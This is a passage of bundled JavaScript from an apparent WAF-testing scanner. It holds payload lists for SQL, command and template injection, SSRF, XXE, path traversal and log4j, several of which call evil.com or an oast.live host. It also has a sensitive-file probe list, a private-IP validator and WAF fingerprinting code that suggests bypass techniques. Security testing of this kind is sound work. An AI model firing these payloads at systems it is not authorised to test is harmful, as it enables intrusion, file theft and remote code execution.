      "<div>Welcome to our site</div>",
      '<img src="logo.png" alt="Company Logo">',
      '<a href="https://example.com">Visit Example</a>',
      "<b>Important Notice</b>",
      "<style>body { color: blue; }</style>",
      '<input type="text" name="username">',
      "<h1>Main Title</h1>",
      "Text with <em>emphasis</em> and <strong>bold</strong>"
    ]
  },
  "Path Traversal": {
    type: "ParamCheck",
    payloads: [
      "../../etc/passwd",
      "../../../../../../../etc/passwd",
      "..\\..\\..\\..\\..\\..\\windows\\win.ini",
      "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ],
    falsePayloads: [
      "images/logo.png",
      "documents/report.pdf",
      "css/styles.css",
      "js/main.js",
      "uploads/file.txt",
      "data/config.json",
      "assets/image.jpg",
      "public/index.html",
      "static/favicon.ico",
      "favicon.ico",
      "files/document.docx",
      "/api/login"
    ]
  },
  "Command Injection": {
    type: "ParamCheck",
    payloads: ["$(cat /etc/passwd)", "| cat /etc/passwd", "; ls -la", "& whoami", "| id", "; ping -c 10 127.0.0.1", "| nc -lvp 4444"],
    falsePayloads: ["Price: $100", "Email: user@domain.com", "Command not found", "Tom & Jerry", "Q&A Section"]
  },
  SSRF: {
    type: "ParamCheck",
    payloads: [
      "http://127.0.0.1/",
      "file:///etc/passwd",
      "http://127.0.0.1/latest/meta-data/",
      "http://localhost:80/",
      "http://0.0.0.0:80/",
      "http://[::1]/",
      "http://example.com@127.0.0.1/",
      "http://169.254.169.254/latest/meta-data/",
      // AWS metadata
      "http://[::ffff:127.0.0.1]",
      // IPv6 bypass
      "http://127.1",
      // Short notation
      "http://0177.0.0.1",
      // Octal bypass
      "http://2130706433",
      // Decimal bypass
      "d0vjq03vq99i18n2rq6gaw9riihcum3it.oast.live"
    ],
    falsePayloads: [
      "https://www.google.com/",
      "https://github.com/user/repo",
      "https://api.example.com/v1/data",
      "https://cdn.jsdelivr.net/npm/bootstrap",
      "https://fonts.googleapis.com/css",
      "https://www.youtube.com/watch?v=xyz",
      "https://stackoverflow.com/questions/123",
      "https://docs.microsoft.com/en-us/",
      "https://www.w3schools.com/html/",
      "https://httpbin.org/get"
    ]
  },
  "NoSQL Injection": {
    type: "ParamCheck",
    payloads: [
      "{'$gt':''}",
      '{"$ne":null}',
      '{"username": {"$ne": null}, "password": {"$ne": null}}',
      '{"$where": "this.password == this.passwordConfirm"}',
      '{"$or": [{}, {}]}'
    ],
    falsePayloads: [
      '{"name": "John & Doe"}',
      '{"age": 25}',
      '{"email": "user@example.com"}',
      '{"status": "active"}',
      '{"category": "electronics"}',
      '{"price": 99.99}',
      '{"description": "Product description"}',
      '{"tags": ["new", "popular"]}',
      '{"created": "2023-01-01"}',
      '{"count": 10 + 2}'
    ]
  },
  "Local File Inclusion": {
    type: "ParamCheck",
    payloads: [
      "php://filter/convert.base64-encode/resource=index.php",
      "/etc/passwd",
      "../../../../../../../../etc/passwd",
      "..\\..\\..\\..\\windows\\win.ini",
      "/proc/self/environ",
      "index.php%00.jpg"
      // Null byte injection bypass
    ],
    falsePayloads: []
  },
  "LDAP Injection": {
    type: "ParamCheck",
    payloads: ["*)(|(uid=*))", "*))(objectClass=*))(|(objectClass=*)", "admin)(|(password=*))"],
    falsePayloads: [
      "uid=john.doe",
      "cn=John Doe",
      "cn=John&Doe",
      "mail=user@example.com",
      "ou=Users",
      "dc=example,dc=com",
      "objectClass=person",
      "sn=Smith",
      "givenName=John",
      "displayName=John Smith",
      "memberOf=cn=Admins"
    ]
  },
  "HTTP Request Smuggling": {
    type: "ParamCheck",
    payloads: ["Transfer-Encoding: chunked\r\n0\r\n\r\nGARBAGE", "0\r\n\r\nGET / HTTP/1.1\r\nHost: example.com"],
    falsePayloads: [
      "Content-Type: application/json",
      "Content-Length: 123",
      "User-Agent: Mozilla/5.0",
      "Accept: text/html",
      "Authorization: Bearer token123",
      "Cache-Control: no-cache",
      "Connection: keep-alive",
      "Host: example.com",
      "Referer: https://example.com",
      "Accept-Language: en-US"
    ]
  },
  "Open Redirect": {
    type: "ParamCheck",
    payloads: [
      "//evil.com",
      "http://evil.com",
      "/\\evil.com",
      "//google.com%2F%2Fevil.com",
      "/login?Redirect=http://evil.com",
      "/login?Redirect=../../../..//evil.com"
    ],
    falsePayloads: ["/login?Redirect=/"]
  },
  "Sensitive Files": {
    type: "FileCheck",
    payloads: [
      ".git",
      ".git/config",
      ".gitignore",
      "requirements.txt",
      "composer.json",
      "composer.lock",
      "package.json",
      "package-lock.json",
      "yarn.lock",
      "config.php",
      "wp-config.php",
      ".env",
      "docker-compose.yml",
      "id_rsa",
      "id_rsa.pub",
      "web.config",
      "appsettings.json",
      "database.yml",
      ".htpasswd",
      ".htaccess",
      "database.bak",
      // Archives & compressed files
      "backup.xz",
      "app.war",
      "backup.tar",
      "backup.tar.gz",
      "backup.tgz",
      "backup.tar.bz2",
      "backup.gz",
      "backup.zip",
      "backup.7z",
      "backup.rar",
      "backup.bz2",
      // Database files
      "dump.sql",
      "database.sql",
      "db.sql",
      "app.db",
      "data.sqlite",
      "data.sqlite3",
      "database.dump",
      "dump.dump",
      // Config files
      "app.conf",
      "server.conf",
      "config.ini",
      "php.ini",
      "config.yaml",
      "config.toml",
      "app.cfg",
      // Crypto / certificates
      "server.pem",
      "private.key",
      "server.key",
      "server.crt",
      "cert.p12",
      "cert.pfx",
      "keystore.jks",
      // Backup / temp files
      "index.php.old",
      "config.php.old",
      "error.log",
      "access.log",
      "debug.log",
      "app.log",
      ".env.bak",
      "config.tmp",
      "data.temp",
      ".index.php.swp",
      "config.php.orig",
      // Scripts
      "deploy.sh",
      "setup.sh",
      "backup.sh",
      "run.bat",
      "deploy.bat",
      "setup.ps1",
      // macOS metadata
      ".DS_Store"
    ],
    falsePayloads: [
      "index.html",
      "style.css",
      "script.js",
      "logo.png",
      "favicon.ico",
      "robots.txt",
      "sitemap.xml",
      "/",
      ".well-known/security.txt"
    ]
  },
  "CRLF Injection": {
    type: "ParamCheck",
    payloads: [
      "%0d%0aSet-Cookie: malicious=true",
      "\r\nLocation: http://malicious.com",
      "%0d%0aContent-Length:0",
      "%250d%250aContent-Length:0"
    ],
    falsePayloads: ["Line 1\\nLine 2", "Line 1\\rLine 2", "Line 1\\r\\nLine 2", "Header and content"]
  },
  "UTF8/Unicode Bypass": {
    type: "ParamCheck",
    payloads: [
      "\\u0027 OR \\u00271\\u0027=\\u00271",
      // Unicode encoded SQL injection
      "%E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991",
      // UTF-8 encoded with fancy quotes
      "\u03A9 OR \u03A9=\u03A9"
      // Using Unicode omega characters
    ],
    falsePayloads: ["Caf\xE9", "na\xEFve", "r\xE9sum\xE9", "pi\xF1ata", "\u041C\u043E\u0441\u043A\u0432\u0430", "\u5317\u4EAC", "\u6771\u4EAC", "\xD1o\xF1o", "Fran\xE7ois", "Z\xFCrich"]
  },
  XXE: {
    type: "ParamCheck",
    payloads: [
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>`,
      "<!DOCTYPE data [<!ENTITY % file SYSTEM 'file:///etc/passwd'> %file;]>",
      '<?xml version="1.0"?><foo>&xxe;</foo>',
      `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><foo>&xxe;</foo>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil'>]><foo>&xxe;</foo>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]><foo>&xxe;</foo>`
    ],
    falsePayloads: [
      '<?xml version="1.0"?><user><name>John</name><email>john@example.com</email></user>',
      '<?xml version="1.0"?><product><id>123</id><name>Widget</name><price>9.99</price></product>',
      '<?xml version="1.0"?><config><setting>value</setting></config>',
      '<?xml version="1.0"?><data><item>Item 1</item><item>Item 2</item></data>',
      '<?xml version="1.0"?><message>Hello World</message>',
      '<?xml version="1.0"?><response><status>success</status></response>',
      '<?xml version="1.0"?><order><customer>John Doe</customer><total>100.00</total></order>',
      '<?xml version="1.0"?><book><title>Sample Title</title><author>Sample Author</author></book>',
      '<?xml version="1.0"?><note><to>John</to><from>Jane</from><message>Hello</message></note>',
      '<?xml version="1.0"?><catalog><item id="1">Product 1</item></catalog>'
    ]
  },
  SSTI: {
    type: "ParamCheck",
    payloads: [
      "{{7*7}}",
      // Jinja2
      "${7*7}",
      // Velocity
      "<%= 7*7 %>",
      // ERB
      "{{=7*7}}",
      // Twig
      "#{7*7}",
      // Ruby
      "{{7*'7'}}",
      // Jinja2 string multiplication
      "{{config}}",
      // Jinja2 variable leak
      "{{self}}",
      // Jinja2 self leak
      "{{[].__class__.__mro__[1].__subclasses__()}}",
      // Jinja2 class leak
      "{{().__class__.__bases__[0].__subclasses__()}}",
      // Python
      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
      // Jinja2 RCE
      "<%={{7*7}}%>",
      // AngularJS
      "${{7*7}}",
      // Go templates
      "{{request}}",
      // Flask/Jinja2
      "{{url_for}}",
      // Flask/Jinja2
      "{{cycler.__init__.__globals__.os.popen('id').read()}}"
      // Jinja2 RCE
    ],
    falsePayloads: ["{{name}}", "{name}"]
  },
  "HTTP Parameter Pollution": {
    type: "ParamCheck",
    payloads: [
      "param=1&param=2",
      "user=admin&user=guest",
      "id=1;id=2",
      "id=1&&id=2",
      "id=1;id=2",
      "id=1,id=2",
      "id=1 id=2",
      "id=1&id=",
      "param=&param=2",
      "param=1&Param=2",
      "param[0]=1&param[1]=2",
      "param[]=1&param[]=2",
      "param=1&%70%61%72%61%6d=2",
      "param=1&par%61m=2",
      "param.1=1&param.2=2",
      "param=1|param=2",
      "param[a]=1&param[b]=2"
    ],
    falsePayloads: [
      "name=John&email=john@example.com",
      "search=product&category=electronics",
      "page=1&limit=10",
      "sort=name&order=asc",
      "filter=active&type=user",
      "id=123&status=enabled",
      "query=test&format=json",
      "lang=en&region=us",
      "theme=dark&size=large",
      "start=0&count=20"
    ]
  },
  "Web Cache Poisoning": {
    type: "Header",
    payloads: [
      "X-Forwarded-Host: evil.com",
      "X-Original-URL: /admin",
      "Cache-Control: no-cache",
      "X-Forwarded-Proto: https",
      "X-Host: evil.com",
      "X-Forwarded-Scheme: javascript://",
      "X-HTTP-Method-Override: PURGE",
      "X-Forwarded-Server: evil.com",
      "X-Forwarded-Port: 443",
      "X-Original-Host: evil.com"
    ],
    falsePayloads: [
      "X-Forwarded-Host: www.example.com",
      "X-Original-URL: /public/page",
      "Cache-Control: max-age=3600",
      "X-Forwarded-Proto: https",
      "X-Host: api.example.com",
      "X-Forwarded-Scheme: https",
      "X-HTTP-Method-Override: PUT",
      "X-Forwarded-Server: proxy.example.com",
      "X-Forwarded-Port: 80",
      "X-Original-Host: cdn.example.com"
    ]
  },
  "IP Bypass": {
    type: "Header",
    payloads: [
      "X-Forwarded-For: 127.0.0.1",
      "X-Remote-IP: 127.0.0.1",
      "X-Remote-Addr: 127.0.0.1",
      "X-Client-IP: 127.0.0.1",
      "X-Real-IP: 127.0.0.1",
      "X-Forwarded-For: 127.0.0.1, evil.com",
      "X-Forwarded-For: 127.0.0.1, 2130706433",
      "X-Forwarded-For: 127.0.0.1, localhost",
      "X-Forwarded-For: 127.0.0.1, 0.0.0.0",
      "X-Forwarded-For: 127.0.0.1, ::1",
      "X-Forwarded-For: 127.0.0.1, 0177.0.0.1",
      "X-Forwarded-For: 127.0.0.1, 127.1"
    ],
    falsePayloads: [
      "X-Forwarded-For: 203.0.113.1",
      "X-Remote-IP: 198.51.100.5",
      "X-Remote-Addr: 192.0.2.10",
      "X-Client-IP: 203.0.113.25",
      "X-Real-IP: 198.51.100.100",
      "X-Forwarded-For: 203.0.113.1, 198.51.100.5",
      "X-Forwarded-For: 192.0.2.1, proxy.example.com",
      "X-Forwarded-For: 203.0.113.50",
      "X-Forwarded-For: 198.51.100.200",
      "X-Real-IP: 203.0.113.75"
    ]
  },
  "User-Agent": {
    type: "Header",
    payloads: [
      "User-Agent:",
      // пустой
      "User-Agent: \0",
      // нуль-байт
      "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)",
      // Googlebot
      "User-Agent: {{7*7}}",
      // SSTI
      `User-Agent: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>`,
      // XXE
      "User-Agent: <script>alert('xss')</script>",
      // XSS
      "User-Agent: %0d%0aSet-Cookie: injected=true",
      // CRLF
      "User-Agent: ' OR '1'='1",
      // SQLi
      "User-Agent: *)(uid=*))(|(uid=*)",
      // LDAP
      "User-Agent: ${jndi:ldap://evil.com/a}",
      // log4j
      "User-Agent: Fuzz Faster U Fool",
      "User-Agent: feroxbuster/2.10.0",
      "User-Agent: gobuster/3.1.0",
      "User-Agent: Firefox"
    ],
    falsePayloads: [
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
      "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
      "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)",
      "User-Agent: Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0",
      "User-Agent: curl/7.68.0",
      "User-Agent: PostmanRuntime/7.28.0",
      "User-Agent: Python-requests/2.25.1",
      "User-Agent: Go-http-client/1.1",
      "User-Agent: Apache-HttpClient/4.5.13"
    ]
  },
  // Merge advanced payloads
  ...ADVANCED_PAYLOADS
};
var ENHANCED_PAYLOADS = {
  ...PAYLOADS,
  ...generateEncodedPayloads(PAYLOADS)
};

// ../core/dist/utils/security.js
function isValidTargetUrl(urlString) {
  try {
    const url = new URL(urlString);
    if (url.protocol !== "http:" && url.protocol !== "https:") {
      return false;
    }
    let hostname = url.hostname;
    if (hostname === "localhost" || hostname === "127.0.0.1" || hostname === "[::1]" || hostname === "::1") {
      return false;
    }
    const isIpv6 = hostname.startsWith("[") && hostname.endsWith("]");
    const ipv6Normalized = isIpv6 ? hostname.slice(1, -1) : "";
    if (ipv6Normalized === "::") {
      return false;
    }
    if (ipv6Normalized.toLowerCase().startsWith("fc") || ipv6Normalized.toLowerCase().startsWith("fd")) {
      return false;
    }
    if (ipv6Normalized.toLowerCase().startsWith("fe8") || ipv6Normalized.toLowerCase().startsWith("fe9") || ipv6Normalized.toLowerCase().startsWith("fea") || ipv6Normalized.toLowerCase().startsWith("feb")) {
      return false;
    }
    if (ipv6Normalized.toLowerCase().startsWith("::") && !ipv6Normalized.toLowerCase().startsWith("::ffff:") && ipv6Normalized !== "::1") {
      const hex = ipv6Normalized.toLowerCase().replace(/^::/, "");
      if (hex.startsWith("7f"))
        return false;
      if (hex.match(/^a[0-9a-f]{2}(:|$)/))
        return false;
      if (hex.startsWith("ac")) {
        const match2 = hex.match(/^ac1[0-9a-f]/);
        if (match2)
          return false;
      }
      if (hex.startsWith("c0a8"))
        return false;
      if (hex.startsWith("a9fe"))
        return false;
      if (hex.startsWith("6440") || hex.startsWith("64:") && hex.slice(3).match(/^[4-7]/))
        return false;
      if (hex.startsWith("c000:"))
        return false;
      if (hex === "c000")
        return false;
      if (hex.startsWith("c612") || hex.startsWith("c613") || hex.startsWith("c6:12") || hex.startsWith("c6:13"))
        return false;
      if (hex.startsWith("c633:64") || hex.startsWith("c633:100:"))
        return false;
      if (hex.startsWith("cb00:71") || hex.startsWith("cb00:113:"))
        return false;
    }
    if (ipv6Normalized.toLowerCase().startsWith("::ffff:")) {
      const lastPart = ipv6Normalized.split(":").pop() || "";
      if (lastPart.includes(".")) {
        hostname = lastPart;
      } else {
        const hex = ipv6Normalized.toLowerCase().replace(/^::ffff:/, "");
        if (hex.startsWith("7f"))
          return false;
        if (hex.match(/^a[0-9a-f]{2}(:|$)/))
          return false;
        if (hex.startsWith("ac")) {
          const match2 = hex.match(/^ac1[0-9a-f]/);
          if (match2)
            return false;
        }
        if (hex.startsWith("c0a8"))
          return false;
        if (hex.startsWith("a9fe"))
          return false;
        if (hex.startsWith("6440") || hex.startsWith("64:") && hex.slice(3).match(/^[4-7]/))
          return false;
        if (hex.startsWith("c000:"))
          return false;
        if (hex === "c000")
          return false;
        if (hex.startsWith("c612") || hex.startsWith("c613") || hex.startsWith("c6:12") || hex.startsWith("c6:13"))
          return false;
        if (hex.startsWith("c633:64") || hex.startsWith("c633:100:"))
          return false;
        if (hex.startsWith("cb00:71") || hex.startsWith("cb00:113:"))
          return false;
      }
    }
    const ipv4Regex = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/;
    const match = hostname.match(ipv4Regex);
    if (match) {
      const octets = match.slice(1).map(Number);
      if (octets[0] === 10)
        return false;
      if (octets[0] === 100 && octets[1] >= 64 && octets[1] <= 127)
        return false;
      if (octets[0] === 127)
        return false;
      if (octets[0] === 169 && octets[1] === 254)
        return false;
      if (octets[0] === 172 && octets[1] >= 16 && octets[1] <= 31)
        return false;
      if (octets[0] === 192 && octets[1] === 0 && octets[2] === 0)
        return false;
      if (octets[0] === 192 && octets[1] === 0 && octets[2] === 2)
        return false;
      if (octets[0] === 192 && octets[1] === 168)
        return false;
      if (octets[0] === 198 && octets[1] >= 18 && octets[1] <= 19)
        return false;
      if (octets[0] === 198 && octets[1] === 51 && octets[2] === 100)
        return false;
      if (octets[0] === 203 && octets[1] === 0 && octets[2] === 113)
        return false;
      if (octets[0] >= 224 && octets[0] <= 239)
        return false;
      if (octets[0] >= 240)
        return false;
      if (octets[0] === 0)
        return false;
    }
    return true;
  } catch {
    return false;
  }
}

// ../core/dist/utils/payload-utils.js
function substitutePayload(obj, payload) {
  if (typeof obj === "string") {
    return obj.replace(/\{PAYLOAD\}/g, payload);
  } else if (Array.isArray(obj)) {
    return obj.map((item) => substitutePayload(item, payload));
  } else if (obj && typeof obj === "object") {
    const result = {};
    for (const [key, value] of Object.entries(obj)) {
      if (key === "__proto__" || key === "constructor" || key === "prototype")
        continue;
      result[key] = substitutePayload(value, payload);
    }
    return result;
  }
  return obj;
}
function processCustomHeaders(customHeadersStr, payload) {
  const headersObj = {};
  if (!customHeadersStr || !customHeadersStr.trim())
    return headersObj;
  for (const line of customHeadersStr.split(/\r?\n/)) {
    const idx = line.indexOf(":");
    if (idx > 0) {
      const name = line.slice(0, idx).trim();
      let value = line.slice(idx + 1).trim();
      if (payload && value.includes("{PAYLOAD}")) {
        value = value.replace(/\{PAYLOAD\}/g, payload);
      }
      headersObj[name] = value;
    }
  }
  return headersObj;
}
function randomUppercase(str) {
  let result = "";
  for (let i = 0; i < str.length; i++) {
    const char = str[i];
    if (char.match(/[a-zA-Z]/) && Math.random() > 0.5) {
      if (char === char.toLowerCase()) {
        result += char.toUpperCase();
      } else {
        result += char.toLowerCase();
      }
    } else {
      result += char;
    }
  }
  return result;
}
function redactHeaders(headers) {
  if (!headers)
    return {};
  const sensitiveHeaders = ["authorization", "cookie", "set-cookie"];
  const redacted = {};
  for (const [key, value] of Object.entries(headers)) {
    if (sensitiveHeaders.includes(key.toLowerCase())) {
      redacted[key] = "[REDACTED]";
    } else {
      redacted[key] = value;
    }
  }
  return redacted;
}
function redactUrl(urlStr) {
  if (!urlStr)
    return urlStr;
  try {
    const hasPayloadPlaceholder = urlStr.includes("{PAYLOAD}");
    const tempUrlStr = hasPayloadPlaceholder ? urlStr.replace(/\{PAYLOAD\}/g, "TEMP_PAYLOAD") : urlStr;
    const url = new URL(tempUrlStr);
    const sensitiveParams = ["token", "key", "auth", "api_key", "apikey", "secret"];
    let changed = false;
    if (url.password) {
      url.password = "[REDACTED]";
      changed = true;
    }
    const params = new URLSearchParams(url.search);
    params.forEach((value, key) => {
      if (sensitiveParams.some((param) => key.toLowerCase().includes(param))) {
        params.set(key, "[REDACTED]");
        changed = true;
      }
    });
    if (changed) {
      url.search = params.toString();
    }
    let result = url.toString();
    if (hasPayloadPlaceholder) {
      result = result.replace(/TEMP_PAYLOAD/g, "{PAYLOAD}");
    }
    return result;
  } catch {
    return urlStr;
  }
}

// ../core/dist/waf-detection.js
var WAFDetector = class {
  static WAF_SIGNATURES = [
    // Cloudflare
    {
      name: "Cloudflare",
      headers: {
        server: /cloudflare/i,
        "cf-ray": /^[a-f0-9]+-[A-Z]{3}$/,
        "cf-cache-status": /.*/,
        "cf-request-id": /.*/,
        "cf-mitigated": /.*/
      },
      statusCodes: [403, 429],
      bodyPatterns: [/cloudflare/i, /attention required! \| cloudflare/i, /ray id: [a-f0-9]+-[A-Z]{3}/i, /Cloudflare Ray ID:/i]
    },
    // AWS WAF
    {
      name: "AWS WAF",
      headers: {
        server: /CloudFront|awselb/i,
        "x-amz-cf-id": /.*/,
        "x-amz-cf-pop": /.*/,
        "x-cache": /^(Hit|Miss) from cloudfront$/i,
        "x-amzn-requestid": /.*/
      },
      statusCodes: [403],
      bodyPatterns: [/forbidden.*you don't have permission to access.*on this server/i, /request blocked/i, /Request blocked\./i]
    },
    // Imperva/Incapsula
    {
      name: "Imperva",
      headers: {
        "x-iinfo": /.*/,
        "x-cdn": /Incapsula/i,
        "set-cookie": /incap_ses_|visid_incap_/i
      },
      statusCodes: [403],
      bodyPatterns: [/incapsula/i, /request unsuccessful. incapsula incident id/i, /generated by cloudflare/i],
      cookiePatterns: [/incap_ses_\d+/, /visid_incap_\d+/]
    },
    // F5 BIG-IP
    {
      name: "F5 BIG-IP",
      headers: {
        server: /BIG-IP/i,
        "x-wa-info": /.*/,
        "f5-trace-id": /.*/
      },
      statusCodes: [403],
      bodyPatterns: [/the requested url was rejected/i, /please consult with your administrator/i, /your support id is/i]
    },
    // ModSecurity
    {
      name: "ModSecurity",
      headers: {
        server: /mod_security|apache/i
      },
      statusCodes: [403, 406],
      bodyPatterns: [/mod_security/i, /not acceptable/i, /apache.*forbidden/i, /request blocked by security policy/i]
    },
    // Akamai
    {
      name: "Akamai",
      headers: {
        server: /AkamaiGHost/i,
        "akamai-origin-hop": /.*/,
        "x-akamai-transformed": /.*/,
        "x-akamai-request-id": /.*/
      },
      statusCodes: [403],
      bodyPatterns: [/access denied/i, /akamai/i, /reference #[0-9a-f]+/i]
    },
    // Barracuda
    {
      name: "Barracuda",
      headers: {
        server: /Barracuda/i,
        "x-barracuda-url": /.*/
      },
      statusCodes: [403],
      bodyPatterns: [/barracuda/i, /access denied/i]
    },
    // Sucuri
    {
      name: "Sucuri",
      headers: {
        server: /Sucuri/i,
        "x-sucuri-id": /.*/,
        "x-sucuri-cache": /.*/
      },
      statusCodes: [403],
      bodyPatterns: [/sucuri website firewall - access denied/i, /questions\? contact us at cloudproxy@sucuri\.net/i]
    },
    // Fastly
    {
      name: "Fastly",
      headers: {
        via: /fastly/i,
        "x-served-by": /cache-.*-fastly/i,
        "x-cache": /(HIT|MISS).*fastly/i
      },
      statusCodes: [403]
    },
    // KeyCDN
    {
      name: "KeyCDN",
      headers: {
        server: /keycdn-engine/i,
        "x-edge-location": /.*/
      },
      statusCodes: [403]
    },
    // StackPath (MaxCDN)
    {
      name: "StackPath",
      headers: {
        server: /NetDNA-cache|stackpath/i,
        "x-hw": /.*/
      },
      statusCodes: [403]
    },
    // DenyAll
    {
      name: "DenyAll",
      headers: {
        server: /denyall/i
      },
      statusCodes: [403],
      bodyPatterns: [/denyall/i]
    },
    // Fortinet FortiWeb
    {
      name: "FortiWeb",
      headers: {
        server: /Fortigate|FortiWeb/i
      },
      statusCodes: [403],
      bodyPatterns: [/web filter violation/i, /fortigate/i]
    },
    // Wallarm
    {
      name: "Wallarm",
      headers: {
        server: /nginx-wallarm/i,
        "x-wallarm-instance": /.*/
      },
      statusCodes: [403, 500]
    },
    // Radware AppWall
    {
      name: "Radware",
      headers: {
        server: /Radware|AppWall/i,
        "x-origin-requestid": /.*/
      },
      statusCodes: [403]
    },
    // Azure Front Door
    {
      name: "Azure Front Door",
      headers: {
        "x-azure-ref": /.*/,
        server: /Microsoft-HTTPAPI\/2\.0/i
      },
      statusCodes: [403],
      bodyPatterns: [/Our services aren't available right now/i, /Your request has been blocked/i, /Microsoft-Azure-Application-Gateway/i]
    },
    // Google Cloud Armor
    {
      name: "Google Cloud Armor",
      headers: {
        server: /^GSE$/i
      },
      statusCodes: [403, 404],
      bodyPatterns: [/Request blocked by Cloud Armor/i, /Access Denied.*Cloud Armor/i]
    },
    // Citrix NetScaler
    {
      name: "Citrix NetScaler",
      headers: {
        server: /NetScaler/i,
        "vi-id": /.*/
      },
      cookiePatterns: [/ns_af=/i, /citrix_ns_id/i],
      statusCodes: [403],
      bodyPatterns: [/The requested URL was rejected\. Please consult with your administrator/i, /NS-CACHE/i]
    },
    // Varnish (often used with WAF modules)
    {
      name: "Varnish",
      headers: {
        server: /varnish/i,
        "x-varnish": /.*/,
        via: /varnish/i
      },
      statusCodes: [403]
    },
    // Palo Alto Networks
    {
      name: "Palo Alto Networks",
      headers: {
        "x-phx": /.*/
      },
      statusCodes: [403],
      bodyPatterns: [/Virus\/Spyware Download Blocked/i, /Palo Alto Next Generation Security Platform/i, /Access Denied/i]
    },
    // Sophos WAF
    {
      name: "Sophos WAF",
      headers: {
        "x-sophos-waf-id": /.*/
      },
      cookiePatterns: [/sophos_waf_id/i],
      statusCodes: [403],
      bodyPatterns: [/Powered by UTM Web Protection/i, /Sophos Firewall/i]
    },
    // Generic detection patterns — require WAF-specific phrases,
    // not just common HTTP words like "forbidden"
    {
      name: "Generic WAF",
      headers: {},
      statusCodes: [403, 406, 429],
      bodyPatterns: [
        /request.*(blocked|rejected|filtered).*by/i,
        /web.*(firewall|application firewall|waf)/i,
        /malicious.*request|suspicious.*activity|attack.*detected/i
      ]
    }
  ];
  /**
   * Get list of supported WAF vendor names
   */
  static getSupportedWafs() {
    return this.WAF_SIGNATURES.map((sig) => sig.name).filter((name) => name !== "Generic WAF");
  }
  /**
   * Detect WAF from HTTP response
   */
  static async detectFromResponse(response, responseBody, responseTime) {
    const evidence = [];
    let bestMatch = {
      name: "Unknown",
      confidence: 0,
      evidence: []
    };
    for (const signature of this.WAF_SIGNATURES) {
      let confidence = 0;
      const matchEvidence = [];
      for (const [headerName, pattern] of Object.entries(signature.headers)) {
        const headerValue = response.headers.get(headerName);
        if (headerValue) {
          if (typeof pattern === "string") {
            if (headerValue.toLowerCase().includes(pattern.toLowerCase())) {
              confidence += 30;
              const displayValue = redactHeaders({ [headerName]: headerValue })[headerName];
              matchEvidence.push(`Header ${headerName}: ${displayValue}`);
            }
          } else if (pattern instanceof RegExp) {
            if (pattern.test(headerValue)) {
              confidence += 30;
              const displayValue = redactHeaders({ [headerName]: headerValue })[headerName];
              matchEvidence.push(`Header ${headerName}: ${displayValue} (matches ${pattern})`);
            }
          }
        }
      }
      if (signature.statusCodes && signature.statusCodes.includes(response.status)) {
        confidence += 20;
        matchEvidence.push(`Status code: ${response.status}`);
      }
      if (responseBody && signature.bodyPatterns) {
        for (const pattern of signature.bodyPatterns) {
          if (pattern.test(responseBody)) {
            confidence += 25;
            matchEvidence.push(`Body pattern match: ${pattern}`);
          }
        }
      }
      if (signature.cookiePatterns) {
        const cookies = response.headers.get("set-cookie");
        if (cookies) {
          for (const pattern of signature.cookiePatterns) {
            if (pattern.test(cookies)) {
              confidence += 20;
              const displayCookie = redactHeaders({ "set-cookie": cookies })["set-cookie"];
              matchEvidence.push(`Cookie pattern match: ${pattern} (in ${displayCookie})`);
            }
          }
        }
      }
      if (responseTime && signature.responseTime) {
        const { min, max } = signature.responseTime;
        if ((min === void 0 || responseTime >= min) && (max === void 0 || responseTime <= max)) {
          confidence += 10;
          matchEvidence.push(`Response time: ${responseTime}ms`);
        }
      }
      if (confidence > bestMatch.confidence) {
        bestMatch = {
          name: signature.name,
          confidence,
          evidence: matchEvidence
        };
      }
    }
    const detected = bestMatch.confidence > 40;
    const suggestedBypassTechniques = this.getSuggestedBypassTechniques(bestMatch.name);
    return {
      detected,
      wafType: detected ? bestMatch.name : "Unknown",
      confidence: bestMatch.confidence,
      evidence: bestMatch.evidence,
      suggestedBypassTechniques
    };
  }
  /**
   * Perform active WAF detection by sending probe requests
   */
  static async activeDetection(url, options) {
    const fetchFn = options?.fetch || globalThis.fetch;
    const probePayloads = ["' OR '1'='1", "<script>alert(1)</script>", "../../../etc/passwd", "UNION SELECT 1,2,3--"];
    const probePromises = probePayloads.map(async (payload) => {
      try {
        const separator = url.includes("?") ? "&" : "?";
        const startTime = Date.now();
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 1e4);
        let response;
        try {
          response = await fetchFn(`${url}${separator}test=${encodeURIComponent(payload)}`, {
            method: "GET",
            redirect: "manual",
            signal: controller.signal
          });
        } finally {
          clearTimeout(timeoutId);
        }
        const responseTime = Date.now() - startTime;
        let responseBody = "";
        const contentLength = response.headers.get("content-length");
        if (contentLength && parseInt(contentLength, 10) > 1048576) {
